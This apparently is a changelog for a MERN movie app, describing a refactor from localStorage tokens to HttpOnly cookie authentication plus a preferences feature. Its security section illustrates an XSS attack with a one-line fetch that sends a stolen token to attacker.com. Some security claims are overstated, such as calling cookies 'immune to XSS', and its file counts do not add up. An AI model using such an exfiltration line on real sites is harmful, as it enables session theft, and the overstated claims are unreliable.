# MERN Movie App - Implementation Changes

**Created: May 8, 2026**  
**Status: Comprehensive auth refactor complete with HttpOnly cookies implementation**

---

## Overview

This document tracks all changes made to the MERN Movie App from initial preferences feature implementation through the security refactoring to use HttpOnly cookies instead of localStorage.

### Key Architecture Decisions

1. **Feature-Based + Layered Architecture** — Each feature (auth, preferences) encapsulates components, hooks, services, and types
2. **HttpOnly Cookies for Authentication** — Production-ready security (immune to XSS attacks)
3. **Credentials-included API calls** — Frontend automatically sends cookies with requests

---

## Phase 1: Initial Setup & Dependencies

### 1.1 Backend Dependencies

**File: `backend/package.json`**

- Added: `cookie-parser` — Parses HttpOnly cookies from request headers

### 1.2 Frontend Dependencies

**File: `frontend/package.json`**

- Added: `react-router-dom` — Client-side routing and navigation

---

## Phase 2: Authentication Context & Infrastructure

### 2.1 Created Authentication Context

**File: `frontend/src/context/AuthContext.ts`**

- Defines `User` interface: `{ id, username, email }`
- Defines `AuthContextType` with methods:
  - `setAuth(user)` — Store authenticated user (token in HttpOnly cookie)
  - `logout()` — Clear authentication
  - `getToken()` — Returns null (token is in HttpOnly cookie, not accessible)
  - `isAuthenticated` — Boolean flag
- Exports `useAuth()` custom hook for any component to access auth context

**Key: Token is NOT stored in context — it's in HttpOnly cookie only**

### 2.2 Created AuthProvider Component

**File: `frontend/src/context/AuthProvider.tsx`**

- Wraps entire app with AuthContext.Provider
- On mount: Calls `GET /api/auth/verify` to check if user is authenticated
  - Verifies cookie on backend, restores user state if valid
  - Prevents re-login on page refresh
- `setAuth(user)` — Only stores user, token handled by cookies
- `logout()` — Calls `POST /api/auth/logout` to clear cookie on backend
- Shows loading screen while checking authentication

**Why this approach:**

- No localStorage needed (secure by default)
- Leverages HttpOnly cookies (automatic with every request)
- Backend validates token, not frontend

### 2.3 Created ProtectedRoute Component

**File: `frontend/src/components/ProtectedRoute.tsx`**

- Higher-order component that wraps routes requiring authentication
- Checks `useAuth().isAuthenticated`
- Redirects to `/signup` if not authenticated
- Allows access if authenticated

**Usage in routing:**

```jsx
<Route
  path="/preferences"
  element={
    <ProtectedRoute>
      <PreferencesScreen />
    </ProtectedRoute>
  }
/>
```

---

## Phase 3: Preferences Feature

### 3.1 Type Definitions

**File: `frontend/src/features/preferences/types/Preferences.ts`**

```typescript
interface Preferences {
  favoriteGenres: string[]; // e.g., ["Action", "Comedy"]
  languages: string[]; // e.g., ["en", "es"]
}
```

### 3.2 Genre & Language Service

**File: `frontend/src/services/genreService.ts`**

- `fetchGenres()` — Calls `GET /api/tmdb/genres`
  - **Updated:** Added `credentials: 'include'` to send cookies
  - Backend returns genres from TMDB
- `fetchLanguages()` — Calls TMDB API directly
  - Fetches from: `https://api.themoviedb.org/3/configuration/languages`
  - Requires `REACT_APP_TMDB_API_KEY` environment variable

### 3.3 Preferences API Service

**File: `frontend/src/features/preferences/services/preferencesService.ts`**

- `updatePreferences(userId, preferences)`
  - Calls `PUT /api/users/:id/preferences`
  - **Updated:**
    - Removed `token` parameter (now in cookie)
    - Added `credentials: 'include'` to send HttpOnly cookie
    - Backend reads token from cookie, no Authorization header needed

### 3.4 Preferences Hook

**File: `frontend/src/features/preferences/hooks/usePreferences.ts`**

- State management:
  - `preferences` — Current genre/language selections
  - `genres`, `languages` — Available options (fetched from APIs)
  - `loading`, `error`, `isLoadingData` — UI states
- Handlers:
  - `handleGenreToggle(genreId)` — Toggle genre selection
  - `handleLanguageToggle(languageCode)` — Toggle language selection
  - `handleSubmit()` — Save preferences to backend
  - `handleSkip()` — Skip without saving
- On mount: Fetches genres and languages from APIs
- On submit:
  - Calls `updatePreferences()` with credentials
  - Backend validates token from cookie
  - Redirects to home (`/`)
- **Updated:** Removed token from `useAuth()` since it's in cookie

### 3.5 Preferences Form Component

**File: `frontend/src/features/preferences/components/PreferencesForm.tsx`**

- Presentational component (no state, all props-driven)
- Props:
  - `preferences` — Current selections
  - `genres`, `languages` — Available options
  - `onGenreToggle`, `onLanguageToggle` — Selection handlers
  - `onSubmit`, `onSkip` — Action handlers
  - `loading`, `error` — UI states
- Renders:
  - Genre checkboxes (multi-select)
  - Language checkboxes (multi-select)
  - "Save Preferences" button (disabled while loading)
  - "Skip for Now" button
  - Error message display
- Styling: Tailwind CSS with Netflix dark theme

### 3.6 Preferences Screen Container

**File: `frontend/src/features/preferences/components/PreferencesScreen.tsx`**

- Container component that orchestrates the preferences feature
- Uses `usePreferences()` hook to get all state and handlers
- Passes everything to `PreferencesForm` for rendering
- Shows loading screen while genres/languages are being fetched

---

## Phase 4: Authentication Flow

### 4.1 Signup Service

**File: `frontend/src/features/auth/services/authService.ts`**

- `signupUser(data)` — `POST /api/auth/register`
  - **Updated:** Added `credentials: 'include'` to send/receive cookies
  - Response no longer includes token (it's in HttpOnly cookie)
  - Returns: `{ status, message, data: { user } }`
- `loginUser(email, password)` — `POST /api/auth/login` (new)
  - **Updated:** Added `credentials: 'include'`
  - Returns: `{ status, message, data: { user } }`

### 4.2 Signup Hook

**File: `frontend/src/features/auth/hooks/useSignupForm.ts`**

- Accepts `navigate` function for post-signup navigation
- State: `formData`, `error`, `loading`
- Handlers:
  - `handleChange()` — Update form field
  - `handleSubmit()` — Signup flow
    1. Validate password (min 6 chars)
    2. Call `signupUser(formData)` with credentials
    3. Extract user from response
    4. Call `setAuth(user)` to store in context (token in cookie)
    5. Navigate to `/preferences`
- **Updated:**
  - Changed `setAuth(user, token)` → `setAuth(user)` (token in cookie)
  - Removed manual token storage logic

### 4.3 Signup Card Component

**File: `frontend/src/features/auth/components/SignupCard.tsx`**

- Container component for signup form
- **Updated:**
  - Added `useNavigate()` import
  - Passes `navigate` to `useSignupForm()` hook
  - On successful signup, automatically redirects to `/preferences`

---

## Phase 5: Routing & App Setup

### 5.1 App Component with Routing

**File: `frontend/src/App.tsx`**

- Wraps with `BrowserRouter` (React Router v6)
- Wraps with `AuthProvider` (outermost for context access)
- Routes:
  - `GET /signup` — Public (SignupCard)
  - `GET /preferences` — Protected (ProtectedRoute → PreferencesScreen)
  - `GET /` — Public (Home placeholder)
  - `*` — Redirects to `/`

### 5.2 Home Page (Placeholder)

**File: `frontend/src/pages/Home.tsx`**

- Simple placeholder page
- Will be expanded with movie listings later
- Shows "Welcome to Movie App" message

---

## Phase 6: Backend Authentication Refactor

### 6.1 CORS & Cookie Configuration

**File: `backend/src/app.ts`**

- **Updated:**
  - Added `import cookieParser from "cookie-parser"`
  - Added CORS configuration with `credentials: true`
    - `origin: env.FRONTEND_URL` — Allow specific frontend domain
    - `credentials: true` — Allow cookies in cross-origin requests
  - Added `app.use(cookieParser())` — Parse cookie headers

**Why:**

- CORS with credentials allows frontend to send/receive cookies
- Cookie parser extracts cookies from request headers

### 6.2 Auth Controller Updates

**File: `backend/src/controllers/AuthController.ts`**

#### Register Endpoint

- **Changed response format:**
  - Before: Returns `{ user, token }` in JSON
  - Now: Sets HttpOnly cookie + returns only `{ user }`
- **Cookie settings:**
  ```typescript
  res.cookie("token", token, {
    httpOnly: true, // Not accessible from JavaScript
    secure: isProduction, // HTTPS only in production
    sameSite: "strict", // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });
  ```

#### Login Endpoint

- Same changes as register endpoint
- Returns only `{ user }`, token in HttpOnly cookie

#### New: Verify Endpoint (`GET /api/auth/verify`)

- Checks if user is authenticated (via cookie)
- Called by `AuthProvider` on app mount
- Validates cookie token and returns user data
- Used for session restoration on page refresh
- **New in AuthController**

#### New: Logout Endpoint (`POST /api/auth/logout`)

- Protected route (requires auth middleware)
- Clears HttpOnly cookie
- Returns success message
- **New in AuthController**

### 6.3 Auth Middleware Updates

**File: `backend/src/middlewares/authMiddleware.ts`**

- **Updated token retrieval:**
  - First tries: `req.cookies.token` (HttpOnly cookie)
  - Fallback: `req.headers.authorization` (for API clients, testing)
  - This makes it backward compatible with Authorization header
- Token validation same as before
- Extracts `userId` and `email` into `req.userId`, `req.email`

**Why two sources:**

- HttpOnly cookies: Used by browser (SPA)
- Authorization header: Used by API clients, Postman, tests

### 6.4 Auth Routes

**File: `backend/src/routes/authRoutes.ts`**

- **Updated/Added:**
  - `POST /api/auth/register` — Create account (existing, refactored)
  - `POST /api/auth/login` — Login (existing, refactored)
  - `POST /api/auth/verify` — Verify token via header (existing, unchanged)
  - `GET /api/auth/verify` — Verify via cookie (new)
  - `POST /api/auth/logout` — Logout (new, protected)

---

## Phase 7: Environment Configuration

### 7.1 Frontend Environment Example

**File: `frontend/.env.example`**

```
REACT_APP_API_URL=http://localhost:5000
REACT_APP_TMDB_API_KEY=your_tmdb_api_key_here
```

**Frontend .env file should contain:**

```
REACT_APP_API_URL=http://localhost:5000
REACT_APP_TMDB_API_KEY=<your_actual_key>
```

### 7.2 Backend Environment

**File: `backend/.env` (should already have)**

```
FRONTEND_URL=http://localhost:3000
NODE_ENV=development
JWT_SECRET=your_secret
```

---

## Security Improvements

### Before (localStorage - Vulnerable)

```javascript
// Frontend
localStorage.setItem("token", token); // Vulnerable to XSS

// With XSS attack:
fetch("https://attacker.com?token=" + localStorage.getItem("token"));
```

### After (HttpOnly Cookies - Secure)

```javascript
// Frontend - Cannot access token!
console.log(document.cookie); // No token shown

// Backend sets:
res.cookie("token", token, {
  httpOnly: true, // ← JavaScript cannot access
  secure: true, // ← HTTPS only
  sameSite: "strict", // ← CSRF protected
});

// Browser automatically sends with requests:
fetch("/api/users/profile", {
  credentials: "include", // ← Sends cookie
});
```

**Security Improvements:**

1. ✅ **XSS Protection** — Token in HttpOnly cookie, unreachable by JavaScript
2. ✅ **CSRF Protection** — SameSite=strict prevents cross-site requests
3. ✅ **HTTPS Enforcement** — Secure flag (production only)
4. ✅ **Automatic Transmission** — No manual header handling needed
5. ✅ **Session Management** — Server-controlled expiration

---

## User Flow (Current)

### Signup & Preferences Flow

```
1. User navigates to http://localhost:3000/signup
   ↓
2. AuthProvider checks auth on mount
   ├─ Calls GET /api/auth/verify (no cookie yet)
   └─ Sets isAuthenticated = false
   ↓
3. User fills signup form & submits
   ├─ useSignupForm validates input
   ├─ Calls signupUser() with credentials: 'include'
   ├─ POST /api/auth/register
   │  ├─ Backend creates user
   │  ├─ Generates JWT token
   │  └─ Sets cookie: Set-Cookie: token=xxx; HttpOnly
   ├─ Frontend receives { user, ... } (no token)
   ├─ Calls setAuth(user) to update context
   └─ Navigates to /preferences
   ↓
4. Preferences screen loads (protected by ProtectedRoute)
   ├─ Checks useAuth().isAuthenticated = true
   ├─ Allows access
   ├─ usePreferences fetches genres/languages
   └─ Renders selection UI
   ↓
5. User selects genres/languages & saves
   ├─ updatePreferences() called
   ├─ Sends PUT /api/users/:id/preferences
   │  └─ credentials: 'include' sends cookie automatically
   ├─ Backend's auth middleware
   │  ├─ Extracts token from req.cookies.token
   │  ├─ Validates token
   │  └─ Sets req.userId
   ├─ Backend updates user.preferences
   └─ Navigates to / (home)
   ↓
6. Page refresh (session restoration)
   ├─ AuthProvider on mount calls GET /api/auth/verify
   │  ├─ Sends cookie automatically
   │  ├─ Backend validates token from cookie
   │  └─ Returns user data
   ├─ Restores user to context
   └─ No re-login needed!
```

---

## File Structure (Updated)

```
frontend/src/
├── context/
│   ├── AuthContext.ts         ← Auth state type & hook
│   └── AuthProvider.tsx       ← Auth provider component
├── components/
│   └── ProtectedRoute.tsx     ← Route guard for authenticated pages
├── services/
│   └── genreService.ts        ← Genre & language API calls
├── pages/
│   └── Home.tsx               ← Home page placeholder
├── features/
│   ├── auth/
│   │   ├── components/
│   │   │   ├── SignupCard.tsx
│   │   │   └── SignupForm.tsx
│   │   ├── hooks/
│   │   │   └── useSignupForm.ts
│   │   ├── services/
│   │   │   └── authService.ts
│   │   └── types/
│   │       └── SignupFormData.ts
│   └── preferences/
│       ├── components/
│       │   ├── PreferencesScreen.tsx
│       │   └── PreferencesForm.tsx
│       ├── hooks/
│       │   └── usePreferences.ts
│       ├── services/
│       │   └── preferencesService.ts
│       └── types/
│           └── Preferences.ts
├── App.tsx                    ← Router & main app
└── index.tsx

backend/src/
├── app.ts                     ← Express app with CORS & cookies
├── controllers/
│   ├── AuthController.ts      ← Auth endpoints (updated)
│   └── ...
├── middlewares/
│   ├── authMiddleware.ts      ← Auth validation (updated)
│   └── ...
├── routes/
│   ├── authRoutes.ts          ← Auth routes (updated)
│   └── ...
├── services/
│   └── ...
└── ...
```

---

## Testing the Flow

### 1. Start Backend

```bash
cd backend
npm run dev
```

Runs on http://localhost:5000

### 2. Start Frontend

```bash
cd frontend
npm start
```

Runs on http://localhost:3000

### 3. Test Signup Flow

- Navigate to http://localhost:3000/signup
- Fill form with:
  - Username: testuser
  - Email: test@example.com
  - Password: password123
- Click "Create Account"
- Should redirect to /preferences

### 4. Verify Cookie is Set

- Open DevTools → Application → Cookies
- Look for `localhost:5000` → Cookie named `token`
- Should have flags: HttpOnly, Secure (if production), SameSite=Strict

### 5. Test Preferences

- Select genres and languages
- Click "Save Preferences"
- Should save and redirect to /

### 6. Test Session Persistence

- On / (home page)
- Refresh page (F5)
- Should stay logged in (no redirect to signup)
- User info should restore from context

### 7. Test Logout

- Add logout button (future feature)
- Should call POST /api/auth/logout
- Should clear cookie
- Should redirect to /signup

---

## Known Limitations & Future Improvements

### Current Limitations

1. **No login endpoint UI** — Only signup works, login endpoint exists but no form
2. **No logout button** — Logout endpoint exists, but no UI to call it
3. **Home page is placeholder** — Needs movie listing implementation
4. **No profile/settings page** — Can't edit preferences after signup
5. **No error recovery UI** — Generic error messages

### Recommended Next Steps

1. Create login page (similar to signup)
2. Add logout button to app header/navbar
3. Build movie listing page for home (`/`)
4. Create profile/settings page to edit preferences
5. Add user profile management (change password, email)
6. Implement watchlist & favorite movies features
7. Add error boundary for better error handling

---

## Important Notes

### For Deployment (Heroku, etc.)

1. **Frontend URL in Backend**

   ```bash
   # backend/.env
   FRONTEND_URL=https://your-frontend.herokuapp.com
   NODE_ENV=production
   JWT_SECRET=<strong_random_secret>
   ```

2. **Environment Variables**

   ```bash
   # frontend/.env
   REACT_APP_API_URL=https://your-backend.herokuapp.com
   REACT_APP_TMDB_API_KEY=<your_key>
   ```

3. **HTTPS Required**
   - Heroku provides free HTTPS
   - Cookies with `secure: true` require HTTPS
   - Will not work over HTTP in production

4. **CORS Headers**
   - Frontend and backend must be on same domain or proper CORS configured
   - Current setup allows one specific frontend origin

### Development vs Production

**Development** (localhost)

```javascript
res.cookie("token", token, {
  httpOnly: true,
  secure: false, // ← HTTP OK
  sameSite: "strict",
});
```

**Production** (HTTPS)

```javascript
res.cookie("token", token, {
  httpOnly: true,
  secure: true, // ← HTTPS required
  sameSite: "strict",
});
```

---

## Summary of Changes

### Total Files Modified/Created: 19

**Backend (6 files):**

- ✅ app.ts — CORS + cookies config
- ✅ AuthController.ts — Cookie handling + verify/logout
- ✅ authMiddleware.ts — Cookie + header token reading
- ✅ authRoutes.ts — New verify/logout routes
- ✅ package.json — Added cookie-parser

**Frontend (11 files):**

- ✅ AuthContext.ts — Auth state (updated)
- ✅ AuthProvider.tsx — Auth provider (refactored)
- ✅ ProtectedRoute.tsx — Route guard
- ✅ genreService.ts — Genre/language API (added credentials)
- ✅ useSignupForm.ts — Signup hook (updated)
- ✅ SignupCard.tsx — Signup component (updated)
- ✅ authService.ts — Auth API (added credentials)
- ✅ usePreferences.ts — Preferences hook (updated)
- ✅ preferencesService.ts — Preferences API (removed token param, added credentials)
- ✅ App.tsx — Routing setup
- ✅ Home.tsx — Placeholder page
- ✅ package.json — Added react-router-dom

**Config (2 files):**

- ✅ .env.example — Environment template
- ✅ CHANGES.md — This documentation

---

## Questions? Debugging?

### Common Issues

**Issue:** "Cookies not being sent"

- Check: `credentials: 'include'` in all fetch calls
- Check: CORS `credentials: true` in backend
- Check: Frontend and backend URLs in environment

**Issue:** "401 Unauthorized after signup"

- Check: Cookie is set in DevTools
- Check: Cookie has HttpOnly flag
- Check: auth middleware is reading from cookies

**Issue:** "Page refresh logs out user"

- Check: AuthProvider's GET /api/auth/verify endpoint
- Check: Backend is returning user data correctly
- Check: Frontend is calling verify on mount

---

**End of CHANGES.md**  
**Last Updated: May 8, 2026**
